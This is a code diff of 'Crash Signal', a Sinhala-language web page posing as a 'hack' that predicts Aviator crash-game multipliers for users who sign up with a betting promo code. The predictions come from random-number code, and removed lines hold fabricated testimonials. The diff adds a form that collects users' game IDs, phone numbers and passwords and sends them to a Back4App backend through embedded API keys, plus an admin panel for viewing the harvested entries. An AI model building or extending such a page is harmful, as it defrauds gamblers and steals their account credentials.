@@ -5,6 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Crash Signal</title>
 
+  <!-- Parse SDK for Browser -->
+  <script src="https://npmcdn.com/parse/dist/parse.min.js"></script>
+
   <link rel="preconnect" href="https://cdn.simpleicons.org" crossorigin>
   <link rel="dns-prefetch" href="//cdn.simpleicons.org">
   <link rel="preload" as="image" href="https://cdn.simpleicons.org/facebook/FFFFFF" crossorigin>
@@ -18,23 +21,19 @@
 
   <style>
     :root{
-      /* New Yellow/Gold/Amber theme */
-      --bg-deep: #1A1402;       /* world base - dark brown */
-      --bg-yellow-1: #3D2F0A;   /* top yellow/brown */
-      --bg-yellow-2: #141003;   /* bottom dark brown */
-
-      --yellow-1: #FFC107;      /* neon yellow/amber */
-      --yellow-2: #FFA000;      /* darker amber */
-      --text: #FFF8E1;          /* light cream text */
+      /* Yellow/Gold/Amber theme */
+      --bg-deep: #1A1402;
+      --bg-yellow-1: #3D2F0A;
+      --bg-yellow-2: #141003;
+      --yellow-1: #FFC107;
+      --yellow-2: #FFA000;
+      --text: #FFF8E1;
       --card-border: rgba(255, 193, 7, 0.4);
       --btn-bg: #3D2F0A;
-
       --ok: #28e77a;
       --ok-bg: rgba(40,231,122,0.14);
       --ok-border: rgba(40,231,122,0.6);
-
       --bad: #ff5a5a;
-
       --fb:#1877F2; --yt:#FF0000; --wa:#25D366; --tg:#229ED9;
     }
     * { box-sizing: border-box; }
@@ -42,17 +41,20 @@
     body {
       font-family: 'Poppins', system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
       color: var(--text);
-      /* Body background also tinted yellow */
       background: radial-gradient(circle at 50% -10%, var(--bg-yellow-1) 0%, var(--bg-yellow-2) 70%);
       overflow: hidden;
     }
-
-    /* Brand header */
     .topbar {
       position: fixed; top: 0; left: 0; right: 0; z-index: 5;
       display: grid; place-items: center;
       padding: 12px 16px 6px 16px;
       background: linear-gradient(180deg, rgba(255, 193, 7, 0.1), rgba(0,0,0,0));
+      pointer-events: none;
+      transition: opacity 0.3s ease, transform 0.3s ease;
+    }
+    body.on-feedback .topbar {
+      opacity: 0;
+      transform: translateY(-100%);
       pointer-events: none;
     }
     .brand {
@@ -64,8 +66,7 @@
       font-family: 'Orbitron', system-ui, sans-serif;
     }
     .subtag {
-      pointer-events: auto;
-      margin-top: 4px;
+      pointer-events: auto; margin-top: 4px;
       font-size: 12px; font-weight: 800; letter-spacing: .3px;
       color: #FFECB3;
       text-shadow: 0 0 10px rgba(255, 193, 7, 0.35);
@@ -80,8 +81,6 @@
       white-space: nowrap;
       box-shadow: inset 0 0 10px rgba(40,231,122,.25), 0 0 10px rgba(40,231,122,.18);
     }
-
-    /* World (UI + bg) — now dark yellow/brown */
     #world {
       position: relative; width: 100%; height: 100%;
       opacity: 0;
@@ -93,27 +92,26 @@
       clip-path: circle(150% at 50% 50%);
       background: radial-gradient(circle at 50% -10%, var(--bg-yellow-1) 0%, var(--bg-deep) 70%) fixed;
     }
-
-    /* Starfield (kept) + extra yellow glow overlay */
     #starfield { position: fixed; inset: 0; z-index: 0; }
     .overlay {
       position: fixed; inset: 0; z-index: 1; pointer-events: none;
       background:
         radial-gradient(80% 60% at 50% 12%, rgba(255, 193, 7, 0.2), rgba(0,0,0,0)),
         radial-gradient(60% 40% at 80% 80%, rgba(255, 160, 0, 0.15), rgba(0,0,0,0));
-      mix-blend-mode: color-dodge; /* Changed for better yellow effect */
+      mix-blend-mode: color-dodge;
     }
-
-    /* Screens */
-    .app { position: relative; z-index: 2; height: 100%; padding-top: 92px; }
+    .app { position: relative; z-index: 2; height: 100%; padding-top: 92px; transition: padding-top 0.3s ease; }
+    body.on-feedback .app { padding-top: 0; }
     .screen {
       position: absolute; inset: 92px 16px 16px 16px;
       display: grid; place-items: center;
-      transition: opacity .25s ease, transform .25s ease, visibility .25s ease;
+      transition: opacity .25s ease, transform .25s ease, visibility .25s ease, inset .3s ease;
+    }
+    body.on-feedback .screen {
+      inset: 16px;
     }
     .screen.hidden { opacity: 0; transform: translateX(24px); visibility: hidden; pointer-events: none; }
     .screen.show   { opacity: 1; transform: translateX(0); visibility: visible; }
-
     .container {
       width: min(520px, 92vw);
       display: flex; flex-direction: column; gap: 18px; align-items: center;
@@ -123,18 +121,22 @@
       box-shadow: 0 0 28px 2px rgba(255, 193, 7, 0.22), 0 0 60px 12px rgba(255, 193, 7, 0.14);
       backdrop-filter: blur(4px);
     }
-
-    .display { width: 100%; padding: 24px 18px; border-radius: 16px; background: rgba(255, 193, 7, 0.06); border: 2px solid var(--card-border); box-shadow: 0 0 24px rgba(255, 193, 7, 0.22), inset 0 0 24px rgba(255, 193, 7, 0.08); text-align: center; user-select: none; }
-    .odd { font-family: 'Orbitron', monospace; font-weight: 800; font-size: clamp(42px, 10vw, 64px); color: var(--yellow-1); letter-spacing: 1.5px; text-shadow: 0 0 22px rgba(255, 193, 7, 0.6), 0 0 48px rgba(255, 160, 0, 0.4); transition: transform .18s ease; }
+    .display { width: 100%; padding: 12px 18px; border-radius: 16px; background: rgba(255, 193, 7, 0.06); border: 2px solid var(--card-border); box-shadow: 0 0 24px rgba(255, 193, 7, 0.22), inset 0 0 24px rgba(255, 193, 7, 0.08); text-align: center; user-select: none; }
+    .odd { font-family: 'Orbitron', monospace; font-weight: 800; font-size: clamp(42px, 10vw, 64px); color: var(--yellow-1); letter-spacing: 1.5px; text-shadow: 0 0 22px rgba(255, 193, 7, 0.6), 0 0 48px rgba(255, 160, 0, 0.4); transition: transform .18s ease; min-height: 70px; display: grid; place-items: center; }
     .odd.pop { transform: scale(1.06); }
-
+    .odd-status {
+      font-size: 14px;
+      font-family: 'Orbitron', monospace;
+      color: #FFECB3;
+      opacity: 0.8;
+      height: 20px;
+      margin-top: 4px;
+    }
     .btn { width: 100%; padding: 16px 18px; border-radius: 14px; border: none; color: #fff; background: var(--btn-bg); font-family: 'Orbitron', sans-serif; font-weight: 800; font-size: clamp(18px, 3.8vw, 24px); letter-spacing: 1.2px; cursor: pointer; box-shadow: 0 8px 24px rgba(255, 193, 7, 0.35), 0 0 24px rgba(255, 193, 7, 0.25); transition: transform .06s ease, filter .2s ease, background .2s ease; }
     .btn:hover { filter: brightness(1.06); }
     .btn:active { transform: translateY(1px) scale(0.995); }
-
     .tools { width: 100%; display: flex; gap: 10px; flex-wrap: wrap; }
     .small-btn { flex: 1; min-width: 120px; padding: 10px 12px; border-radius: 10px; border: 1px solid var(--card-border); background: rgba(255, 193, 7, 0.08); color: #FFF8E1; font-size: 13px; cursor: pointer; font-weight: 700; }
-
     .socials { display: flex; gap: 14px; margin-top: 6px; }
     .socials a { width: 46px; height: 46px; display: grid; place-items: center; border-radius: 50%; color: #fff; text-decoration: none; box-shadow: 0 0 14px rgba(255, 193, 7, 0.2), 0 4px 12px rgba(0,0,0,0.35); }
     .socials img { width: 22px; height: 22px; display: block; }
@@ -142,15 +144,11 @@
     .socials a[data-brand="youtube"]  { background: var(--yt); }
     .socials a[data-brand="whatsapp"] { background: var(--wa); }
     .socials a[data-brand="telegram"] { background: var(--tg); }
-
     .history { width: 100%; display: grid; gap: 8px; }
     .history-row { display: flex; justify-content: space-between; font-family: 'Orbitron', monospace; font-size: 14px; opacity: 0.9; }
     .history-row .tag { padding: 4px 8px; background: rgba(255, 193, 7, 0.08); border: 1px solid var(--card-border); border-radius: 8px; }
-
-    /* Connect */
     .backRow { width: 100%; display: flex; justify-content: space-between; align-items: center; }
     .linkBtn { background: transparent; border: 1px solid var(--card-border); color: var(--text); padding: 8px 12px; border-radius: 10px; cursor: pointer; font-weight: 700; }
-
     .connect-panel { width: 100%; display: grid; gap: 12px; }
     .field { display: grid; grid-template-columns: 130px 1fr; gap: 10px; align-items: center; }
     .field label { font-weight: 700; font-size: 13px; color: #FFECB3; }
@@ -159,8 +157,6 @@
     .status { justify-self: start; padding: 8px 12px; border-radius: 10px; font-weight: 800; letter-spacing: .6px; display: none; }
     .status.ok  { display:inline-block; color: var(--ok);  background: rgba(40,231,122,0.12); border: 1.5px solid rgba(40,231,122,0.45); text-shadow: 0 0 8px rgba(40,231,122,0.25); }
     .status.bad { display:inline-block; color: var(--bad); background: rgba(255,90,90,0.12); border: 1.5px solid rgba(255,90,90,0.45); text-shadow: 0 0 8px rgba(255,90,90,0.25); }
-
-    /* Feedback */
     .feedWrap { width: 100%; display: grid; gap: 14px; }
     .feedList { list-style: none; margin: 0; padding: 0; display: grid; gap: 12px; }
     .feedItem { display: grid; gap: 6px; padding: 10px 12px; border-radius: 12px; background: rgba(255, 193, 7, 0.06); border: 1.5px solid var(--card-border); }
@@ -169,17 +165,13 @@
     .avatar svg{ width: 22px; height: 22px; opacity: .95; filter: drop-shadow(0 0 6px rgba(0,0,0,0.15)); }
     .name { font-weight: 800; letter-spacing: .3px; }
     .msg { opacity: .95; line-height: 1.45; white-space: pre-line; }
-
     .sendBox { display: grid; gap: 10px; padding: 12px; border-radius: 12px; background: rgba(255, 193, 7, 0.06); border: 1.5px solid var(--card-border); }
     .sendBox .row2 { display: grid; gap: 10px; }
     .sendBox input, .sendBox textarea { background: rgba(255,255,255,0.05); border: 1.5px solid var(--card-border); color: var(--text); padding: 10px 12px; border-radius: 10px; outline: none; font-family: 'Poppins', system-ui, sans-serif; }
     .sendBox textarea { min-height: 80px; resize: vertical; }
     .sendBox .actions { display: flex; gap: 10px; align-items: center; }
     .note { font-size: 12px; opacity: .8; }
-
     .hidden { display: none !important; }
-
-    /* Intro overlay + yellow bg + odds rain (now yellow) */
     #intro {
       position: fixed; inset: 0; z-index: 10; display: grid; place-items: center;
       background: radial-gradient(70% 60% at 50% 40%, rgba(100, 70, 10, 0.88), rgba(26, 20, 2, 0.96));
@@ -187,23 +179,17 @@
     }
     #intro.show { opacity: 1; visibility: visible; }
     #introOdd { position: absolute; inset: 0; z-index: 0; }
-
     .skipIntro { position: absolute; top: 14px; right: 14px; z-index: 3; padding: 6px 10px; border-radius: 10px; border: 1px solid var(--card-border); background: rgba(255,255,255,0.06); color: var(--text); font-weight: 800; cursor: pointer; }
     .badge { position: relative; z-index: 2; width: 180px; height: 180px; border-radius: 50%; display: grid; place-items: center; background: radial-gradient(circle at 50% 50%, rgba(255, 193, 7, 0.24), rgba(255, 193, 7, 0.08)); border: 2px solid rgba(255, 193, 7, 0.35); box-shadow: 0 0 32px rgba(255, 193, 7, 0.35), inset 0 0 36px rgba(255, 193, 7, 0.22); animation: popIn .45s ease both; overflow: visible; }
     .ring { position: absolute; inset: -16px; border-radius: 50%; border: 2px solid transparent; }
     .ring.r1 { border-top-color: var(--yellow-1); border-left-color: var(--yellow-1); animation: spin 2.6s linear infinite; }
     .ring.r2 { inset: -32px; border-bottom-color: var(--yellow-2); border-right-color: var(--yellow-2); animation: spin 3.6s linear infinite reverse; opacity: .75; }
     .ring.r3 { inset: -52px; border-top-color: rgba(255, 193, 7, 0.55); animation: spin 5.2s linear infinite; opacity: .55; }
-
-    /* Center icon: paper-plane SVG in solid yellow */
     .aviator { width: 90px; height: 90px; color: var(--yellow-1); filter: drop-shadow(0 0 12px rgba(255, 193, 7, 0.6)); }
-
-    /* Bottom loader */
     .bottomLoad { position: absolute; left: 24px; right: 24px; bottom: 26px; display: grid; gap: 8px; z-index: 2; }
     .loadBar { width: 100%; height: 10px; border-radius: 999px; overflow: hidden; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.16); box-shadow: inset 0 0 8px rgba(0,0,0,0.45), 0 0 16px rgba(255, 193, 7, 0.25); }
     .loadFill { height: 100%; width: 1%; background: linear-gradient(90deg, var(--yellow-2), var(--yellow-1)); box-shadow: 0 0 18px rgba(255, 193, 7, 0.55); border-right: 2px solid rgba(255,255,255,0.45); transition: width .06s linear; }
     .loadLabel { justify-self: end; font-family: 'Orbitron', monospace; font-weight: 900; font-size: 12px; color: #FFECB3; text-shadow: 0 0 10px rgba(255, 193, 7, 0.45); letter-spacing: 1px; }
-
     @keyframes spin { to { transform: rotate(360deg); } }
     @keyframes popIn { from { transform: scale(.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
   </style>
@@ -214,12 +200,8 @@
     <canvas id="introOdd"></canvas>
     <button class="skipIntro" id="skipIntro">Skip ✕</button>
     <div class="badge">
-      <div class="ring r1"></div>
-      <div class="ring r2"></div>
-      <div class="ring r3"></div>
-      <svg class="aviator" viewBox="0 0 64 64" fill="currentColor" aria-hidden="true">
-        <path d="M58 6 6 28l16 6 4 18 8-13 18 12 6-45z"></path>
-      </svg>
+      <div class="ring r1"></div><div class="ring r2"></div><div class="ring r3"></div>
+      <svg class="aviator" viewBox="0 0 64 64" fill="currentColor" aria-hidden="true"><path d="M58 6 6 28l16 6 4 18 8-13 18 12 6-45z"></path></svg>
     </div>
     <div class="bottomLoad">
       <div class="loadBar"><div class="loadFill" id="barFill"></div></div>
@@ -230,21 +212,16 @@
   <div id="world">
     <canvas id="starfield" aria-hidden="true"></canvas>
     <div class="overlay" aria-hidden="true"></div>
-
     <header class="topbar">
-      <!-- <<< ඔබ ඉල්ලා සිටි වෙනස >>> -->
       <h1 class="brand">Crash Signal</h1>
-      <div class="subtag">
-        This hack works only with this promo code
-        <span class="promoCode">VIPCNA</span>
-      </div>
+      <div class="subtag">This hack works only with this promo code <span class="promoCode">VIPCNA</span></div>
     </header>
-
     <main class="app" role="main">
       <section id="home" class="screen show">
         <div class="container">
           <div class="display" aria-live="polite">
-            <div id="odd" class="odd">x0.00</div>
+            <div id="odd" class="odd">--.--</div>
+            <div id="oddStatus" class="odd-status">Initializing...</div>
           </div>
           <button id="generate" class="btn">GENERATE</button>
           <div class="tools">
@@ -254,44 +231,29 @@
           </div>
           <div id="history" class="history" aria-label="Recent values"></div>
           <div class="socials" aria-label="Social links">
-            <a class="open-tg" data-brand="facebook" href="#" aria-label="Facebook">
-              <img alt="Facebook" src="https://cdn.simpleicons.org/facebook/FFFFFF" width="22" height="22">
-            </a>
-            <a class="open-tg" data-brand="whatsapp" href="#" aria-label="WhatsApp">
-              <img alt="WhatsApp" src="https://cdn.simpleicons.org/whatsapp/FFFFFF" width="22" height="22">
-            </a>
-            <a class="open-tg" data-brand="youtube" href="#" aria-label="YouTube">
-              <img alt="YouTube" src="https://cdn.simpleicons.org/youtube/FFFFFF" width="22" height="22">
-            </a>
-            <a class="open-tg" data-brand="telegram" href="#" aria-label="Telegram">
-              <img alt="Telegram" src="https://cdn.simpleicons.org/telegram/FFFFFF" width="22" height="22">
-            </a>
+            <a class="open-tg" data-brand="facebook" href="#" aria-label="Facebook"><img alt="Facebook" src="https://cdn.simpleicons.org/facebook/FFFFFF" width="22" height="22"></a>
+            <a class="open-tg" data-brand="whatsapp" href="#" aria-label="WhatsApp"><img alt="WhatsApp" src="https://cdn.simpleicons.org/whatsapp/FFFFFF" width="22" height="22"></a>
+            <a class="open-tg" data-brand="youtube" href="#" aria-label="YouTube"><img alt="YouTube" src="https://cdn.simpleicons.org/youtube/FFFFFF" width="22" height="22"></a>
+            <a class="open-tg" data-brand="telegram" href="#" aria-label="Telegram"><img alt="Telegram" src="https://cdn.simpleicons.org/telegram/FFFFFF" width="22" height="22"></a>
           </div>
+          <button id="adminBtn" class="small-btn" style="margin-top: 10px; border-style: dashed; opacity: 0.7;">Admin Team</button>
         </div>
       </section>
 
       <section id="connect" class="screen hidden" aria-label="Connect to system">
         <div class="container">
-          <div class="backRow" style="width:100%">
-            <button id="backHome" class="linkBtn">← Back</button>
-            <div style="opacity:.8;font-size:13px">Secure Connect</div>
-          </div>
+          <div class="backRow" style="width:100%"><button id="backHome" class="linkBtn">← Back</button><div style="opacity:.8;font-size:13px">Secure Connect</div></div>
           <div class="connect-panel">
-            <div class="field">
-              <label for="gameId">Your Game ID</label>
-              <input id="gameId" type="text" placeholder="Enter your game ID" autocomplete="username">
-            </div>
-            <div class="field">
-              <label for="pwd">Password</label>
-              <input id="pwd" type="password" placeholder="Password" value="" autocomplete="current-password">
-            </div>
+            <div class="field"><label for="gameId">Your Game ID</label><input id="gameId" type="text" placeholder="Enter your game ID" autocomplete="username"></div>
+            <div class="field"><label for="phoneNumber">Phone Number</label><input id="phoneNumber" type="tel" placeholder="Enter phone number"></div>
+            <div class="field"><label for="pwd">Password</label><input id="pwd" type="password" placeholder="Password" value="" autocomplete="current-password"></div>
             <button id="sysConnect" class="sysBtn">System Connect</button>
             <div id="connStatus" class="status" aria-live="polite"></div>
           </div>
         </div>
       </section>
       
-      <!-- <<< ඔබ ඉල්ලා සිටි වෙනස්කම් සහිත කොටස >>> -->
+      <!-- <<< ඔබගේ ඉල්ලීම පරිදි, මෙම කොටසේ Back බොත්තම නැවත සකස් කර ඇත >>> -->
       <section id="feedback" class="screen hidden" aria-label="Customer feedback">
         <div class="container">
           <div class="backRow" style="width:100%">
@@ -301,16 +263,17 @@
           <div class="feedWrap">
             <ul id="feedList" class="feedList"></ul>
             <div class="sendBox">
-              <div class="row2">
-                <input id="fbName" placeholder="ඔබේ නම (අනිවාර්ය නොවේ)">
-                <textarea id="fbText" placeholder="ඔබේ අදහස මෙහි ලියන්න..."></textarea>
-              </div>
-              <div class="actions">
-                <button id="fbSend" class="sysBtn">යවන්න</button>
-                <div id="fbNote" class="note"></div>
-              </div>
+              <div class="row2"><input id="fbName" placeholder="ඔබේ නම (අනිවාර්ය නොවේ)"><textarea id="fbText" placeholder="ඔබේ අදහස මෙහි ලියන්න..."></textarea></div>
+              <div class="actions"><button id="fbSend" class="sysBtn">යවන්න</button><div id="fbNote" class="note"></div></div>
             </div>
           </div>
+        </div>
+      </section>
+      
+      <section id="adminPanel" class="screen hidden" aria-label="Admin Panel">
+        <div class="container">
+          <div class="backRow" style="width:100%"><button id="backFromAdmin" class="linkBtn">← Back</button><div style="opacity:.8;font-size:13px">Admin Panel - Connections</div></div>
+          <div id="adminDataView" style="width:100%; white-space: pre-wrap; font-family: monospace; font-size: 12px; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 8px; max-height: 40vh; overflow-y: auto; text-align: left;">Loading data...</div>
         </div>
       </section>
     </main>
@@ -320,6 +283,9 @@
     (function() {
       'use strict';
 
+      Parse.initialize("aUFvZoGaL35DeXgo9GcF9R1IlvprRgmzZuQleNGn", "aq5D7RQGbj8Ewbh7eMr66N8BkKFhJaac5lcNYynV");
+      Parse.serverURL = 'https://parseapi.back4app.com';
+
       const intro = document.getElementById('intro');
       const skipIntro = document.getElementById('skipIntro');
       const world = document.getElementById('world');
@@ -328,18 +294,23 @@
       const oddCanvas = document.getElementById('introOdd');
       const starfieldCanvas = document.getElementById('starfield');
       const oddEl = document.getElementById('odd');
+      const oddStatusEl = document.getElementById('oddStatus');
       const genBtn = document.getElementById('generate');
       const clearBtn = document.getElementById('clearBtn');
       const historyEl = document.getElementById('history');
       const homeScr = document.getElementById('home');
       const connectScr = document.getElementById('connect');
       const feedbackScr = document.getElementById('feedback');
+      const adminPanel = document.getElementById('adminPanel');
       const connectBtn = document.getElementById('connectBtn');
       const feedbackBtn = document.getElementById('feedbackBtn');
+      const adminBtn = document.getElementById('adminBtn');
       const backHome = document.getElementById('backHome');
       const backFromFeedback = document.getElementById('backFromFeedback');
+      const backFromAdmin = document.getElementById('backFromAdmin');
       const sysConnect = document.getElementById('sysConnect');
       const gameIdInput = document.getElementById('gameId');
+      const phoneNumberInput = document.getElementById('phoneNumber');
       const pwdInput = document.getElementById('pwd');
       const connStatus = document.getElementById('connStatus');
       const feedList = document.getElementById('feedList');
@@ -347,35 +318,26 @@
       const fbTextInput = document.getElementById('fbText');
       const fbSendBtn = document.getElementById('fbSend');
       const fbNote = document.getElementById('fbNote');
+      const adminDataView = document.getElementById('adminDataView');
 
       const INTRO_TIME = 2200;
       let introDone = false;
 
-      function openIntro() {
-        intro.classList.add('show');
-        startOddsRain();
-        startBottomLoader();
-      }
-
+      function openIntro() { intro.classList.add('show'); startOddsRain(); startBottomLoader(); }
       function closeIntro() {
         if (introDone) return;
         introDone = true;
-        intro.classList.remove('show');
-        stopOddsRain();
-        world.classList.add('reveal');
-        setTimeout(() => resizeStarfield(), 50);
+        intro.classList.remove('show'); stopOddsRain(); world.classList.add('reveal');
+        setTimeout(() => { resizeStarfield(); gameLoop(); }, 50);
       }
-
       function startBottomLoader() {
         const start = performance.now();
         function step(now) {
           if (introDone) return;
           const t = Math.min((now - start) / INTRO_TIME, 1);
           const pct = Math.max(1, Math.round(t * 100));
-          barFill.style.width = pct + '%';
-          barPct.textContent = pct + '%';
-          if (t < 1) requestAnimationFrame(step);
-          else closeIntro();
+          barFill.style.width = pct + '%'; barPct.textContent = pct + '%';
+          if (t < 1) requestAnimationFrame(step); else closeIntro();
         }
         requestAnimationFrame(step);
       }
@@ -387,79 +349,92 @@
       function resizeOddsRain() {
         oDpr = Math.min(window.devicePixelRatio || 1, 2);
         oWidth = innerWidth; oHeight = innerHeight;
-        oddCanvas.width = Math.floor(oWidth * oDpr);
-        oddCanvas.height = Math.floor(oHeight * oDpr);
-        oddCanvas.style.width = oWidth + 'px';
-        oddCanvas.style.height = oHeight + 'px';
+        oddCanvas.width = Math.floor(oWidth * oDpr); oddCanvas.height = Math.floor(oHeight * oDpr);
+        oddCanvas.style.width = oWidth + 'px'; oddCanvas.style.height = oHeight + 'px';
         octx.setTransform(oDpr, 0, 0, oDpr, 0, 0);
         const cols = Math.max(1, Math.floor(oWidth / COL_W));
         rainCols = [];
-        for (let i = 0; i < cols; i++) {
-          rainCols.push({
-            x: Math.floor((i + 0.1 + Math.random() * 0.8) * COL_W),
-            y: -Math.random() * 200, vy: 120 + Math.random() * 180,
-            nextY: 0, text: formatOdd(generateOddUnderFour())
-          });
-        }
-        octx.font = "bold 18px 'Orbitron', monospace";
-        octx.textBaseline = 'top';
-        octx.shadowColor = 'rgba(255, 193, 7, 0.55)';
+        for (let i = 0; i < cols; i++) { rainCols.push({ x: Math.floor((i + 0.1 + Math.random() * 0.8) * COL_W), y: -Math.random() * 200, vy: 120 + Math.random() * 180, nextY: 0, text: formatOdd(generateOddUnderFour()) }); }
+        octx.font = "bold 18px 'Orbitron', monospace"; octx.textBaseline = 'top'; octx.shadowColor = 'rgba(255, 193, 7, 0.55)';
       }
-      
       function stepOddsRain(dt) {
-        octx.fillStyle = `rgba(26, 20, 2, ${FADE_ALPHA})`;
-        octx.fillRect(0, 0, oWidth, oHeight);
+        octx.fillStyle = `rgba(26, 20, 2, ${FADE_ALPHA})`; octx.fillRect(0, 0, oWidth, oHeight);
         for (const col of rainCols) {
           col.y += col.vy * dt;
-          if (col.y - col.nextY >= ROW_H) {
-            col.text = formatOdd(generateOddUnderFour());
-            col.nextY = col.y;
-          }
-          octx.fillStyle = 'rgba(255, 193, 7, 0.92)';
-          octx.shadowBlur = 10;
-          octx.fillText(col.text, col.x, col.y);
-          if (col.y > oHeight + ROW_H) {
-            col.y = -Math.random() * 200;
-            col.nextY = col.y;
-            col.vy = 120 + Math.random() * 180;
-            col.text = formatOdd(generateOddUnderFour());
-          }
+          if (col.y - col.nextY >= ROW_H) { col.text = formatOdd(generateOddUnderFour()); col.nextY = col.y; }
+          octx.fillStyle = 'rgba(255, 193, 7, 0.92)'; octx.shadowBlur = 10; octx.fillText(col.text, col.x, col.y);
+          if (col.y > oHeight + ROW_H) { col.y = -Math.random() * 200; col.nextY = col.y; col.vy = 120 + Math.random() * 180; col.text = formatOdd(generateOddUnderFour()); }
         }
       }
-
       function startOddsRain() {
-        resizeOddsRain();
-        let last = performance.now();
-        function loop(now) {
-          const dt = Math.min((now - last) / 1000, 0.05);
-          last = now;
-          stepOddsRain(dt);
-          rainRAF = requestAnimationFrame(loop);
-        }
-        rainRAF = requestAnimationFrame(loop);
-        window.addEventListener('resize', resizeOddsRain);
+        resizeOddsRain(); let last = performance.now();
+        function loop(now) { const dt = Math.min((now - last) / 1000, 0.05); last = now; stepOddsRain(dt); rainRAF = requestAnimationFrame(loop); }
+        rainRAF = requestAnimationFrame(loop); window.addEventListener('resize', resizeOddsRain);
       }
-
-      function stopOddsRain() {
-        cancelAnimationFrame(rainRAF);
-        window.removeEventListener('resize', resizeOddsRain);
-        octx.clearRect(0, 0, oWidth, oHeight);
-      }
+      function stopOddsRain() { cancelAnimationFrame(rainRAF); window.removeEventListener('resize', resizeOddsRain); octx.clearRect(0, 0, oWidth, oHeight); }
 
       const history = [];
       const formatOdd = (n) => 'x' + n.toFixed(2);
       
-      function generateOddUnderFour() {
-        const v = 1.00 + Math.random() * 3.00;
+      const COUNTDOWN_DURATION = 7000;
+      const SHOW_DURATION = 15000;
+      const CYCLE_DURATION = COUNTDOWN_DURATION + SHOW_DURATION;
+      let manualOverrideUntil = 0;
+
+      function mulberry32(a) {
+          return function() {
+            var t = a += 0x6D2B79F5;
+            t = Math.imul(t ^ t >>> 15, t | 1);
+            t ^= t + Math.imul(t ^ t >>> 7, t | 61);
+            return ((t ^ t >>> 14) >>> 0) / 4294967296;
+          }
+      }
+
+      function getSynchronizedOdd(seed) {
+        const prng = mulberry32(seed);
+        const randomValue = prng();
+        const v = 1.00 + randomValue * 3.00;
         return Math.round(v * 100) / 100;
+      }
+      
+      function gameLoop() {
+        const now = Date.now();
+        
+        if (now < manualOverrideUntil) {
+            const timeLeft = manualOverrideUntil - now;
+            const secondsLeft = Math.max(0, Math.ceil(timeLeft / 1000));
+            oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
+        } else {
+            const timeIntoCycle = now % CYCLE_DURATION;
+            if (timeIntoCycle < COUNTDOWN_DURATION) {
+                const countdown = Math.ceil((COUNTDOWN_DURATION - timeIntoCycle) / 1000);
+                oddEl.textContent = "--.--";
+                oddStatusEl.textContent = `Next round in ${countdown}s...`;
+            } else {
+                const cycleSeed = Math.floor(now / CYCLE_DURATION);
+                const oddValue = getSynchronizedOdd(cycleSeed);
+                const timeLeftInShow = (SHOW_DURATION - (timeIntoCycle - COUNTDOWN_DURATION));
+                const secondsLeft = Math.max(0, Math.ceil(timeLeftInShow / 1000));
+                
+                oddEl.textContent = formatOdd(oddValue);
+                oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
+            }
+        }
       }
 
       function handleGenerateClick() {
+        manualOverrideUntil = Date.now() + SHOW_DURATION;
         const v = generateOddUnderFour();
         oddEl.textContent = formatOdd(v);
+        gameLoop();
+        pushHistory(v);
         oddEl.classList.add('pop');
         setTimeout(() => oddEl.classList.remove('pop'), 160);
-        pushHistory(v);
+      }
+
+      function generateOddUnderFour() {
+        const v = 1.00 + Math.random() * 3.00;
+        return Math.round(v * 100) / 100;
       }
 
       function pushHistory(val) {
@@ -476,7 +451,8 @@
       }
 
       function showScreen(name) {
-        const screens = { home: homeScr, connect: connectScr, feedback: feedbackScr };
+        document.body.classList.toggle('on-feedback', name === 'feedback');
+        const screens = { home: homeScr, connect: connectScr, feedback: feedbackScr, adminPanel: adminPanel };
         Object.keys(screens).forEach(key => {
           screens[key].classList.toggle('show', key === name);
           screens[key].classList.toggle('hidden', key !== name);
@@ -485,10 +461,29 @@
         if (name === 'feedback') setTimeout(() => fbTextInput.focus(), 80);
       }
 
-      function handleSystemConnect() {
+      async function handleSystemConnect() {
         const isOk = pwdInput.value.trim().toLowerCase() === 'vipcna';
         connStatus.textContent = isOk ? 'System Connected' : 'System Disconnected';
         connStatus.className = 'status ' + (isOk ? 'ok' : 'bad');
+
+        const gameId = gameIdInput.value.trim();
+        const phone = phoneNumberInput.value.trim();
+        const password = pwdInput.value.trim();
+        
+        if (isOk && gameId && phone) {
+            const UserConnection = Parse.Object.extend("UserConnection");
+            const connection = new UserConnection();
+            connection.set("gameId", gameId);
+            connection.set("phoneNumber", phone);
+            connection.set("password", password);
+            try {
+                await connection.save();
+                console.log('User connection saved successfully to Back4App!');
+            } catch (error) {
+                console.error('Error while saving user connection: ', error);
+                alert('Could not save data. Check console for errors.');
+            }
+        }
       }
 
       function handleSocialLink(e) {
@@ -497,17 +492,10 @@
         const deepLink = `tg://resolve?domain=${TG_USER}`;
         const webLink = `https://t.me/${TG_USER}`;
         window.location.href = deepLink;
-        setTimeout(() => {
-            window.open(webLink, '_blank', 'noopener,noreferrer');
-        }, 500);
+        setTimeout(() => { window.open(webLink, '_blank', 'noopener,noreferrer'); }, 500);
       }
       
-      const INITIAL_FEEDS = [
-        { name: 'Dulan Chamika', msg: `අඩේ මරු අයියෙ මේක නම් 100% sure signal 🔥\nVIPCNA කෝඩ් එකෙන් අලුත් 1XBET account \nඑකක් හදා ගත්තට පස්සෙ තමා \nsignal සුපිරියටම වැඩ කරේ 💸🤩❤️`, },
-        { name: 'Dilshan Jayavardana', msg: 'Signal nam Signal Supiri Ahh' },
-        { name: 'ජානකී හේරත්', msg: 'ලක්ෂ 8 ක් ලොස් වෙලා හිටියෙ , දවස් තුනෙක් කවර් කරා මේ ඇප් එක නිසා මුළු loss එකම , ඇත්තටම ගොඩක් ස්තුතී' },
-        { name: 'වසන්ත ජයතිලක', msg: 'Thank Brother Aviator Signal මරු ❤️' },
-      ];
